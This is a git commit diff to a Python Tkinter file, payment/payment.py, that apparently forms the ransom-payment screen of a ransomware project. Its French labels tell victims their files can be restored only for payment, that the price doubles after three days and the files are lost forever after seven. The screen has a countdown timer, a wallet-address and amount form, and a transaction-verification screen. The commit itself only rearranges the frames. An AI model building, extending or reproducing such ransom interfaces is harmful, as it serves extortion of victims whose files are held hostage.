cbde49edfab5f004ea512994ef598817fe430a55
LinelinLove <chrisline.lin@outlook.fr>
2024-12-19 19:07:56 +0100

    fix

--- payment/payment.py
+++ payment/payment.py
@@ -15,15 +15,19 @@ root.config(bg="red")
 root.grid_rowconfigure(0, weight=1)
 root.grid_columnconfigure(0, weight=1)
 
+# Initialisation des Frames
 paymentFrame = Frame(root, bg="white", width=1200, height=600, pady=20, padx=20)
-
 formFrame = Frame(root, bg="white", width=1200, height=600, pady=20, padx=40)
+loadingFrame = Frame(root, bg="white", width=1200, height=600, pady=40, padx=40)
+successFrame = Frame(root, bg="white", width=1200, height=600, pady=40, padx=40)
 
+# Initialisation du compteur
 counter_label = Label(paymentFrame, text="", bg="white")
 counter_label.grid(row=10, column=0, pady=20)
 target_date = datetime.now() + timedelta(days=7)
 update_counter(counter_label, root, target_date)
 
+# Frame Payment
 img_label = Label(paymentFrame, image=logo, bg="white")
 img_label.image = logo
 img_label.grid(row=0, column=0, columnspan=2, pady=10)
@@ -35,11 +39,13 @@ Label(paymentFrame, text="Puis-je récupérer mes fichiers ?", bg="white").grid(
 Label(paymentFrame, text="Bien sûr. Nous vous garantissons que nous pouvons restaurer tous vos fichiers de manière sécurisé et simple.\n", bg="white").grid(column=0, row=4)
 Label(paymentFrame, text="Vous avez 3 jours pour valider le paiment. Passer les jours, le prix sera doublé.\nSi vous ne payez pas au bout de 7 jours, vous ne pourrez plus jamais restaurer vos fichiers.\n", bg="white").grid(column=0, row=5)
 Label(paymentFrame, text="Veuillez procéder au paiement pour récupérer vos informations.\n", bg="white").grid(column=0, row=6)
+
 ttk.Button(paymentFrame, text="Payer", command=lambda: show_form_frame(paymentFrame, formFrame)).grid(row=7, column=0)
 
+paymentFrame.grid(row=0, column=0, padx=100, pady=100)
 
 
-# Formulaire
+# Frame Formulaire
 img_label = Label(formFrame, image=logo, bg="white")
 img_label.image = logo
 img_label.grid(row=0, column=0, columnspan=2, pady=10)
@@ -70,26 +76,18 @@ confirmation_label.grid(row=7, column=0, columnspan=2, pady=10)
 
 # Bouton Soumettre
 submit_button = ttk.Button(formFrame, text="Soumettre", command=lambda: submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_entry, formFrame, loadingFrame, successFrame, confirmation_label, logo)).grid(row=8, column=0, columnspan=2, pady=10)
-
-# Frame de chargement (initialement cachée)
-loadingFrame = Frame(root, bg="white", width=1200, height=600, pady=40, padx=40)
-
-img_label = Label(loadingFrame, image=logo, bg="white")
-img_label.image = logo
-img_label.grid(row=0, column=0, columnspan=2)
-
-Label(loadingFrame, text="LessiDoidlam1\n", bg="white").grid(column=0, row=1, columnspan=2, pady=10)
-Label(loadingFrame, text="Vérification de la transaction en cours...", bg="white").grid(row=2, column=0, padx=100, pady=100)
-
-# Frame de succès (initialement cachée)
-successFrame = Frame(root, bg="white", width=1200, height=600, pady=40, padx=40)
-
 ttk.Button(formFrame, text="Retour", command=lambda: show_payment_frame(formFrame, paymentFrame)).grid(row=8, column=0)
 
 counter_label = Label(formFrame, text="", bg="white")
 counter_label.grid(row=10, column=0, pady=20)
 update_counter(counter_label, root, target_date)
 
-paymentFrame.grid(row=0, column=0, padx=100, pady=100)
+
+# Frame de chargement
+img_label = Label(loadingFrame, image=logo, bg="white")
+img_label.image = logo
+img_label.grid(row=0, column=0, columnspan=2)
+Label(loadingFrame, text="LessiDoidlam1\n", bg="white").grid(column=0, row=1, columnspan=2, pady=10)
+Label(loadingFrame, text="Vérification de la transaction en cours...", bg="white").grid(row=2, column=0, padx=100, pady=100)
 
 root.mainloop()
